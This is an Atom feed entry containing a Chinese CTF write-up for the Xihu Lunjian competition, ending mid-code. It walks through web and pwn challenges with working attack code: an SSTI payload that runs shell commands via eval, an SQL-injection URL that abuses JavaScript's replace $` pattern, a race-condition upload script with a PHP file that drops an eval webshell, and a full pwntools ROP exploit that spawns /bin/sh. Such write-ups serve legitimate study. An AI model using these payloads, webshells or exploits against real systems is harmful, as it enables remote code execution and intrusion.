<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ya1orin🍭</title>
  
  
  <link href="https://ya1orin.github.io/atom.xml" rel="self"/>
  
  <link href="https://ya1orin.github.io/"/>
  <updated>2025-03-03T07:47:21.604Z</updated>
  <id>https://ya1orin.github.io/</id>
  
  <author>
    <name>Ya1orin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>西湖论剑 By 金石滩小鲨鱼</title>
    <link href="https://ya1orin.github.io/posts/9451627c.html"/>
    <id>https://ya1orin.github.io/posts/9451627c.html</id>
    <published>2025-03-03T07:34:57.000Z</published>
    <updated>2025-03-03T07:47:21.604Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="欢迎来到第八届西湖论剑大赛"><a href="#欢迎来到第八届西湖论剑大赛" class="headerlink" title="欢迎来到第八届西湖论剑大赛"></a>欢迎来到第八届西湖论剑大赛</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/40618712/1737190075599-b137fd66-74ff-44b3-91f2-ad15b3bab32d.png" alt="img"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Rank-l"><a href="#Rank-l" class="headerlink" title="Rank-l"></a>Rank-l</h2><p>但测试后存在部分过滤，随便上网找现成的 payload 打一下，发现能用。</p><p><a href="https://tttang.com/archive/1698/#toc_payload">https://tttang.com/archive/1698/#toc_payload</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303153932439-1141025691.png" alt="image-20250303153928170"></p><p>先看源码，发现黑名单</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303153943287-2103488790.png" alt="image-20250303153938985"></p><p>Unicode 编码绕过即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303153948816-1789841801.png" alt="image-20250303153944618"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303153954142-242207623.png" alt="image-20250303153949897"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;head+\u002f\u0066\u006c\u0061\u0067\u0066\u0031\u0034\u0039&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="sqli-or-not"><a href="#sqli-or-not" class="headerlink" title="sqli or not"></a>sqli or not</h2><p>给了源码，下面测试一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>(); <span class="comment">// 需要创建 express 实例</span></span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>(); <span class="comment">// 创建路由实例</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">info</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/\,/ig</span>)) &#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&#x27;hacker1!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> info = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">info</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Received info:&#x27;</span>, info);</span><br><span class="line">    <span class="keyword">if</span> (info.<span class="property">username</span> &amp;&amp; info.<span class="property">password</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> username = info.<span class="property">username</span>;</span><br><span class="line">      <span class="keyword">var</span> password = info.<span class="property">password</span>;</span><br><span class="line">      <span class="keyword">if</span> (info.<span class="property">username</span>.<span class="title function_">match</span>(<span class="regexp">/\&#x27;|\&quot;|\\/</span>) || info.<span class="property">password</span>.<span class="title function_">match</span>(<span class="regexp">/\&#x27;|\&quot;|\\/</span>)) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;hacker2!&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> sql = <span class="string">&quot;select * from userinfo where username = &#x27;&#123;username&#125;&#x27; and password = &#x27;&#123;password&#125;&#x27;&quot;</span>;</span><br><span class="line">      sql = sql.<span class="title function_">replace</span>(<span class="string">&quot;&#123;username&#125;&quot;</span>, username);</span><br><span class="line">      sql = sql.<span class="title function_">replace</span>(<span class="string">&quot;&#123;password&#125;&quot;</span>, password);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Received sql:&#x27;</span>, sql);</span><br><span class="line"></span><br><span class="line">      connection.<span class="title function_">query</span>(sql, <span class="keyword">function</span> (<span class="params">err, rs</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          res.<span class="title function_">end</span>(<span class="string">&#x27;error1&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (rs.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            res.<span class="title function_">sendFile</span>(<span class="string">&#x27;/flag&#x27;</span>); </span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">end</span>(<span class="string">&#x27;username or password error&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;please input the data&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;please input the data&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定路由</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, router);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器</span></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is running at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>参考一下 ctfshow 的ctfshow344 来绕过逗号</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154018125-768914369.png" alt="image-20250303154014042"></p><p>接下来就是绕过<code>&#39;&quot;</code>和 <code>\\</code></p><p>搜索到</p><p><a href="https://blog.finalize.ink/2020/12/08/网鼎杯2020-babyjs复现/#0x02-代码审计-url.parse">https://blog.finalize.ink/2020/12/08/%e7%bd%91%e9%bc%8e%e6%9d%af2020-babyjs%e5%a4%8d%e7%8e%b0/#0x02-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-url.parse</a></p><p>网鼎 2020 半决的一道 js 题，使用二次编码和@前会被url解码绕过的单引号，但是他的是url.parse 函数，可惜了。</p><p>之后翻看match 和 replace 函数的官方文档，发现了 replace 的一个特性：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154055077-1207226526.png" alt="image-20250303154050528"></p><p>$<code>插入匹配子字符串之前的字符串片段,如果我们 username 中输入$</code> 的话，那么他之前的片段就是select * from userinfo where username = ‘这一段，这样就可以帮助我们闭合前面的单引号了，至于后面那些只需要#全部给注释掉即可。</p><p>最终 payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.155.126.78:18056/?info=&#123;&quot;username&quot;:&quot;$` or 1=1%23&quot;&amp;info=&quot;password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="Rank-U"><a href="#Rank-U" class="headerlink" title="Rank-U"></a>Rank-U</h2><p>登录框，密码爆破之后发现密码为 admin/year2000，登陆后是文件上传，发现什么都能上传，但除图片之外其余的都会被删掉，考虑条件竞争，拷打 GPT 编写脚本得到如下内容:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://139.155.126.78:22542/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0&quot;</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">MAX_CONCURRENT_REQUESTS = <span class="number">600</span>  <span class="comment"># 最大并发请求数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">find_php_route</span>(<span class="params">session, base_url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;异步获取 PHP 文件列表&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(base_url, headers=HEADERS, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">            <span class="keyword">if</span> response.status == <span class="number">200</span>:</span><br><span class="line">                html = <span class="keyword">await</span> response.text()</span><br><span class="line">                matches = re.findall(<span class="string">r&#x27;href=&quot;([^&quot;]+\.php)&quot;&#x27;</span>, html)</span><br><span class="line">                <span class="keyword">return</span> matches <span class="keyword">if</span> matches <span class="keyword">else</span> []</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error finding PHP routes: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">check_php_file</span>(<span class="params">session, file_url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;异步检查 PHP 文件是否可访问&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 确保 URL 是完整的</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file_url.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            file_url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/<span class="subst">&#123;file_url&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(file_url, headers=HEADERS, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">            <span class="keyword">if</span> response.status == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Success! <span class="subst">&#123;file_url&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Failed to access: <span class="subst">&#123;file_url&#125;</span> (status code: <span class="subst">&#123;response.status&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error accessing <span class="subst">&#123;file_url&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;主任务：发现并访问 PHP 文件&quot;&quot;&quot;</span></span><br><span class="line">    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_REQUESTS)  <span class="comment"># 设置并发限制</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=connector) <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 异步发现 PHP 文件</span></span><br><span class="line">            php_files = <span class="keyword">await</span> find_php_route(session, BASE_URL)</span><br><span class="line">            <span class="keyword">if</span> php_files:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Found PHP routes:&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> php_file <span class="keyword">in</span> php_files:</span><br><span class="line">                    php_url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/<span class="subst">&#123;php_file&#125;</span>&quot;</span> <span class="keyword">if</span> <span class="keyword">not</span> php_file.startswith(<span class="string">&quot;http&quot;</span>) <span class="keyword">else</span> php_file</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot; - <span class="subst">&#123;php_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 异步并发检查所有发现的 PHP 文件</span></span><br><span class="line">                tasks = [check_php_file(session, php_file) <span class="keyword">for</span> php_file <span class="keyword">in</span> php_files]</span><br><span class="line">                results = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 如果任何一个文件可访问，则停止</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">any</span>(results):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Successfully accessed a PHP file. Exiting.&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    asyncio.run(main())</span><br></pre></td></tr></table></figure><p>bp 在进行发包，线程调整到 200，传入内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$folder = <span class="string">&quot;Uploads/127.0.0.1/&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!is_dir($folder)) &#123;</span><br><span class="line">    mkdir($folder, 0755, true);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $folder . <span class="string">&quot;111.php&quot;</span>;</span><br><span class="line">$content = <span class="string">&quot;&lt;?php phpinfo();@eval(\$_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span>;</span><br><span class="line">file_put_contents($filename, $content);</span><br><span class="line">echo <span class="string">&quot;File $filename has been created with webshell content in folder $folder.&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154106212-687839310.png" alt="image-20250303154102024"></p><p>写入的同时访问，最终成功，用蚁剑连接可得 flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154118712-281379835.png" alt="image-20250303154114506"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154134430-68076412.png" alt="image-20250303154130440"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><p>rev不出来，这逆向题太有意思了，遗憾退场</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Vpwn"><a href="#Vpwn" class="headerlink" title="Vpwn"></a>Vpwn</h2><p>c++题目</p><p>审读代码，有四个功能，push，pop，edit和show</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154159430-223255095.png" alt="image-20250303154155140"></p><p>调试发现，push8次，之后show的话会外带出来libc地址，这里接受转换一下，并计算偏移得到libc地址</p><p>之后edit就是本题的关键，这里存在数组溢出，并对我们输入数据进行一个加密，我们需要写加密一下paylaod，之后利用</p><p>溢出走system的rop链子，劫持程序流程，getshell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154204872-1708182323.png" alt="image-20250303154200848"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154209449-699283542.png" alt="image-20250303154205479"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154213847-1866135337.png" alt="image-20250303154209902"></p><p>成功劫持程序流程，执行我们的payload</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154219385-433703884.png" alt="image-20250303154215153"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sys</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;139.155.126.78&#x27;,25416)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;Enter your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    rl(<span class="string">&quot;Enter the value to push: &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">rl(<span class="string">&quot;StackVector contents: &quot;</span>)</span><br><span class="line">data = rl(<span class="string">b&#x27;\n&#x27;</span>).split(<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(data[<span class="number">19</span>]) * (<span class="number">1</span> &lt;&lt; <span class="number">32</span>) + (<span class="built_in">int</span>(data[<span class="number">18</span>]) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">libc_base=libc_addr-<span class="number">0x29d90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system,bin_sh=get_sys()</span><br><span class="line">rdi = libc_base+libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).__next__()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_entry</span>(<span class="params">index, value=<span class="string">b&#x27;1&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;edit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;value&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(value), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_data</span>(<span class="params">data, part</span>):</span><br><span class="line">    <span class="keyword">if</span> part == <span class="number">0</span>:</span><br><span class="line">        result = data &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = (data &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> result &gt; <span class="number">0x7FFFFFFF</span>:</span><br><span class="line">        result -= <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">update_entry(<span class="number">18</span>,split_data(rdi+<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">update_entry(<span class="number">19</span>,split_data(rdi+<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line">update_entry(<span class="number">20</span>,split_data(rdi,<span class="number">0</span>))</span><br><span class="line">update_entry(<span class="number">21</span>,split_data(rdi,<span class="number">1</span>))</span><br><span class="line">update_entry(<span class="number">22</span>,split_data(bin_sh,<span class="number">0</span>))</span><br><span class="line">update_entry(<span class="number">23</span>,split_data(bin_sh,<span class="number">1</span>))</span><br><span class="line">update_entry(<span class="number">24</span>,split_data(system,<span class="number">0</span>))</span><br><span class="line">update_entry(<span class="number">25</span>,split_data(system,<span class="number">1</span>))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h2 id="Heaven’s-door"><a href="#Heaven’s-door" class="headerlink" title="Heaven’s door"></a>Heaven’s door</h2><p>查一手保护，开了NX没有PIE</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154227692-430847096.png" alt="image-20250303154223735"></p><p>看下源码，明显有沙箱</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154231959-603529432.png" alt="image-20250303154227990"></p><p>直接先运行跑一下看看怎么事儿，有一堆字符串之后有输入</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154236280-803911230.png" alt="image-20250303154232281"></p><p>结合源码，发现让我们读入shellcode，但明显开了沙盒，查一下禁用了什么函数</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154240740-1693565750.png" alt="image-20250303154236720"></p><p>看沙盒的话是只允许使用这几个函数，并且syscall只能用三次，抱着试试的心态，用了openat+sendfile试了试，直接出了，怀疑是题目出的有点问题</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 